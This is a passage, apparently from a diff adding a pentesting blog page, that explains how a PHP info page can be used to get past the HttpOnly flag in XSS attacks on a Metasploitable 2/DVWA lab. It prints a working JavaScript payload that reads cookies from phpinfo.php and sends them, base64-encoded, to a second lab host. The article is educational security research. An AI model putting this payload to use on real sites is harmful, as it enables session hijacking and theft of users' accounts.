+  </button>
+</div>
+
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;script&gt;</span><span class="nx">fetch</span><span class="p">(</span><span class="dl">'</span><span class="s1">http://192.168.240.128/dvwa/phpinfo.php</span><span class="dl">'</span><span class="p">).</span><span class="nx">then</span><span class="p">(</span><span class="nx">response</span><span class="o">=&gt;</span><span class="nx">response</span><span class="p">.</span><span class="nx">text</span><span class="p">()).</span><span class="nx">then</span><span class="p">(</span><span class="nx">data</span><span class="o">=&gt;</span><span class="p">{</span><span class="kd">const</span> <span class="nx">startString</span><span class="o">=</span><span class="dl">'</span><span class="s1">&lt;tr&gt;&lt;td class="e"&gt;HTTP_COOKIE &lt;/td&gt;&lt;td class="v"&gt;</span><span class="dl">'</span><span class="p">;</span><span class="kd">const</span> <span class="nx">endString</span><span class="o">=</span><span class="dl">'</span><span class="s1">&lt;/td&gt;&lt;/tr&gt;</span><span class="dl">'</span><span class="p">;</span><span class="kd">const</span> <span class="nx">startIndex</span><span class="o">=</span><span class="nx">data</span><span class="p">.</span><span class="nx">indexOf</span><span class="p">(</span><span class="nx">startString</span><span class="p">)</span><span class="o">+</span><span class="nx">startString</span><span class="p">.</span><span class="nx">length</span><span class="p">;</span><span class="kd">const</span> <span class="nx">endIndex</span><span class="o">=</span><span class="nx">data</span><span class="p">.</span><span class="nx">indexOf</span><span class="p">(</span><span class="nx">endString</span><span class="p">,</span><span class="nx">startIndex</span><span class="p">);</span><span class="kd">const</span> <span class="nx">cookies</span><span class="o">=</span><span class="nx">data</span><span class="p">.</span><span class="nx">substring</span><span class="p">(</span><span class="nx">startIndex</span><span class="p">,</span><span class="nx">endIndex</span><span class="p">);</span><span class="kd">const</span> <span class="nx">encodedCookies</span><span class="o">=</span><span class="nx">btoa</span><span class="p">(</span><span class="nx">cookies</span><span class="p">);</span><span class="nx">fetch</span><span class="p">(</span><span class="dl">'</span><span class="s1">http://192.168.240.129/</span><span class="dl">'</span><span class="o">+</span><span class="dl">'</span><span class="s1">?encodedCookies=</span><span class="dl">'</span><span class="o">+</span><span class="nx">encodedCookies</span><span class="p">,{</span><span class="na">method</span><span class="p">:</span><span class="dl">'</span><span class="s1">GET</span><span class="dl">'</span><span class="p">});});</span><span class="nt">&lt;/script&gt;</span>
+</code></pre></div></div>
+<p>This payload is much more accurate than the one used in the previous section because it sends only the cookies to the web server, without all the non-relevant HTML code. Repeating all the process of the previous section but executing this payload instead of the other one, you will receive a GET request like this</p>
+
+<p><img src="/assets/images/2022-11-12-bypass-httponly-via-php-info-page/user-cookies-exfiltrated-improved-payload.png" alt=""></p>
+
+<p>The encoded cookies are sent through the encodedCookies GET parameter, so decoding it with the burpsuite decoder we can get the user cookies</p>
+
+<p><img src="/assets/images/2022-11-12-bypass-httponly-via-php-info-page/user-cookies-exfiltrated-decoded-improved-payload.png" alt=""></p>
+
+<p>As you can see, only the cookies are sent.</p>
+
+<div id="section-id-2-4"></div>
+
+<h2 id="24-important-notes">2.4. Important notes</h2>
+
+<p>Ok, we can exfiltrate some user cookies with the flag <em>HttpOnly</em> set to <em>true</em> but… Can we exfiltrate all the user cookies of the website? The answer is <strong>it depends</strong>.</p>
+
+<p>Go to your browser and create some test cookies like in the following screenshot</p>
+
+<p><img src="/assets/images/2022-11-12-bypass-httponly-via-php-info-page/test-cookies.png" alt=""></p>
+
+<p>Don’t forget to set to <em>true</em> the <em>HttpOnly</em> flag and write the same paths of the screenshot below. If you go to the PHP info page you are going to see something like this</p>
+
+<p><img src="/assets/images/2022-11-12-bypass-httponly-via-php-info-page/phpinfo-dvwa-2.png" alt=""></p>
+
+<p>Not all the cookies are displayed but… Why? That’s because the <em>path</em> value.</p>
+
+<blockquote>
+  <p><img class="emoji" title=":warning:" alt=":warning:" src="https://github.githubassets.com/images/icons/emoji/unicode/26a0.png" height="20" width="20"> <span style="color:red">PHP info page can be used to exfiltrate any user cookie whose path is a parent path of the path where the PHP info page is located. In other words, only cookies whose path is a prefixed path of the path in which the PHP info page is located can be exfiltrated.</span></p>
+</blockquote>
+
+<p>Taking into account that the PHP info page path is <em>/dvwa/phpinfo</em> and applying this rule, we can now understand the above screenshot:</p>
+
+<ul>
+  <li>
+<em>cookie1</em> appears because the path <em>/dvwa/phpinfo</em> is a parent path of the PHP info page path (both are the same path).</li>
+  <li>
+<em>cookie2</em> appears because the path <em>/dvwa</em> is a parent path of the PHP info page path.</li>
+  <li>
+<em>cookie3</em> appears because the path <em>/</em> is a parent path of the PHP info page path.</li>
+  <li>
+<em>cookie4</em> doesn’t appear because the path <em>/dvwa/phpinfo/test</em> is not a parent path of the PHP info page path.</li>
+  <li>
+<em>cookie5</em> doesn’t appear because the path <em>/test</em> is not a parent path of the PHP info page path.</li>
+</ul>
+
+<p>There is another PHP info page in the root path of <em>Metasploitable 2</em> as you can see in the following screenshot</p>
+
+<p><img src="/assets/images/2022-11-12-bypass-httponly-via-php-info-page/phpinfo-raiz-2.png" alt=""></p>
+
+<p>The only cookie whose path is a parent path of the PHP info page path is <em>cookie3</em>, that’s because is the only cookie displayed. You can see that the rule works.</p>
+
+<div id="section-id-3"></div>
+
+<h2 id="3-conclusions">3. Conclusions</h2>
+
+<ul>
+  <li>
+<em>Metasploitable 2</em> is a good environment for testing certain vulnerabilities and not having to create a vulnerable environment from scratch.</li>
+  <li>Low severity vulnerabilities such as PHP info page disclosure are usually wrongly evaluated as “low severity” is often considered synonymous with “not important”.</li>
+  <li>PHP info page disclosure can be used to bypass the <em>HttpOnly</em> flag of some user cookies and exfiltrate them during an XSS exploitation. The only requirement is that the cookie path must be a parent path of the path where the PHP info page is located.</li>
+</ul>
+
+
+        
+      </section>
+
+      <footer class="page__meta">
+        
+        
+  
+
+
+  
+  
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-tags" aria-hidden="true"></i> Tags: </strong>
+    <span itemprop="keywords">
+    
+      
+      
+      <a href="/tags/#base64" class="page__taxonomy-item" rel="tag">base64</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#burpsuite" class="page__taxonomy-item" rel="tag">burpsuite</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#bypass" class="page__taxonomy-item" rel="tag">bypass</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#exfiltrate-cookies" class="page__taxonomy-item" rel="tag">exfiltrate cookies</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#metasploitable-2" class="page__taxonomy-item" rel="tag">metasploitable 2</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#php-info-page" class="page__taxonomy-item" rel="tag">php info page</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#session-hijacking" class="page__taxonomy-item" rel="tag">session hijacking</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#web-pentesting" class="page__taxonomy-item" rel="tag">web pentesting</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#xss" class="page__taxonomy-item" rel="tag">xss</a>
+    
+    </span>
+  </p>
+
+
+
+
+  
+
+
+  
+  
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-folder-open" aria-hidden="true"></i> Categories: </strong>
+    <span itemprop="keywords">
+    
+      
+      
+      <a href="/categories/#pentesting-article" class="page__taxonomy-item" rel="tag">pentesting article</a>
+    
+    </span>
+  </p>
+
+
+        
+          <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Updated:</strong> <time datetime="2022-11-12T00:00:00+01:00">November 12, 2022</time></p>
+        
+      </footer>
+
+      
+
+      
+  <nav class="pagination">
+    
+      <a href="/posts/2022/10/17/sql-injection-in-a-login-form/" class="pagination--pager" title="Time-based SQL injection in a login form
+">Previous</a>
+    
+    
+      <a href="/posts/2023/03/06/reflected-xss-bypassing-redirect-due-to-javascript-function/" class="pagination--pager" title="Reflected XSS bypassing a 302 Security Redirect due to the presence of Javascript function calls
+">Next</a>
+    
+  </nav>
+
+    </div>
+
+    
+  </article>
+
+  
+  
+  <script src="/assets/scripts/copyCode.js"></script>
+
+</div>
+
+    </div>
+
+    
+
+    <div class="page__footer">
+      <footer>
+        <!-- start custom footer snippets -->
+<div style="background-color: #333; padding: 20px; text-align: center;">
+  <p style="color: white; font-size: 24px;">⭐ Liked this blog? Give it a <a href="https://github.com/HackCommander/hackcommander.github.io" style="color: white; font-weight: bold;">GitHub star</a>! ⭐</p>
+  <p style="color: white; font-size: 24px;">🔎 Connect with me on <a href="https://www.linkedin.com/in/%E2%98%91iv%C3%A1n-santos-malpica-1023a11b4/" style="color: white; font-weight: bold;">LinkedIn</a> for more hacking and bug bounty content! 🔎</p>
+  <p style="color: white; font-size: 24px;">🛍️ Interested in the products I use? Check out my <a href="https://hackcommander.github.io/advertising/" style="color: white; font-weight: bold;">recommended products</a> page for nice deals! 🛍️</p>
+  <p style="color: white; font-size: 24px;">☕️ If you found this blog helpful, consider <a href="https://www.buymeacoffee.com/ivansantos" style="color: white; font-weight: bold;">buying me a coffee</a>. Thanks a latte! ☕️</p>
+</div>
+<!-- end custom footer snippets -->
+
+        <div class="page__footer-follow">
+  <ul class="social-icons">
+    
+
+    
+
+    <li><a href="/feed.xml"><i class="fas fa-fw fa-rss-square" aria-hidden="true"></i> Feed</a></li>
+  </ul>
+</div>
+
+<div class="page__footer-copyright">© 2023 Iván Santos Malpica</div>
+
+      </footer>
+    </div>
+
+    
+  <script src="/assets/js/main.min.js"></script>
+  <script data-search-pseudo-elements defer src="https://use.fontawesome.com/releases/v5.7.1/js/all.js" integrity="sha384-eVEQC9zshBn0rFj4+TU78eNA19HMNigMviK/PU/FFjLXqa/GKPgX58rvt5Z8PLs7" crossorigin="anonymous"></script>
+
+
+
+
+<!-- Google tag (gtag.js) -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-JGTZF7HYRM"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-JGTZF7HYRM');
+</script>
+
+
+
+  </body>
+</html>
